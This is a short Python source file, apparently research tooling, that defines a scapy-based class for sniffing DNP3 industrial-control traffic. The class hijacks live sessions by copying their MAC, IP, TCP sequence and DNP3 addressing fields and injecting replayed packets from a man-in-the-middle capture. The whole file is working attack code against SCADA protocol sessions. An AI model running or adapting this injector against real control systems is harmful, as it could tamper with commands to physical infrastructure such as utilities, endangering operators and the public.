__author__ = 'Nicholas Rodofile'
from DNP3_Injection_replay import *
from scapy.all import IP, TCP

'''
Usage
injector = InjectionReplayUpdater("mitm/replay_20160225_1634.pcap")
sniff(iface='eth1', filter="tcp and host 192.168.10.221", prn=injector.process_pkt, count=600)
'''

class InjectionReplayUpdater(InjectionReplay):
    def __init__(self, pcap):
        InjectionReplay.__init__(self, pcap)
        self.pcap = rdpcap(pcap)
        self.pcap_count = 0
        self.dnp3 = self.pcap[self.pcap_count][DNP3]
        self.ack = 0

    def update_injection(self, p):
        self.ether.src = p[Ether].src
        self.ether.dst = p[Ether].dst
        self.ip.src = p[IP].src
        self.ip.dst = p[IP].dst
        self.tcp.sport = p[TCP].sport
        self.tcp.dport = p[TCP].dport
        self.tcp.seq = p[TCP].seq + len(p[DNP3])
        self.tcp.ack = p[TCP].ack
        self.dnp3[DNP3].SOURCE = p[DNP3].SOURCE
        self.dnp3[DNP3].DESTINATION = p[DNP3].DESTINATION
        self.dnp3[DNP3].SEQUENCE += 1
        self.dnp3[DNP3ApplicationControl].SEQ += 1
        self.count += 1
        if self.count == 3:
            self.inject_packet()
            self.count = 0

    def process_pkt(self, p):
        if p.haslayer(DNP3):
            if p[DNP3].CONTROL.DIR == 0:
                self.update_injection(p)
            #if p[DNP3ApplicationControl].CON == SET and p[TCP].seq == self.ack:
            #    self.ack_injection(p)


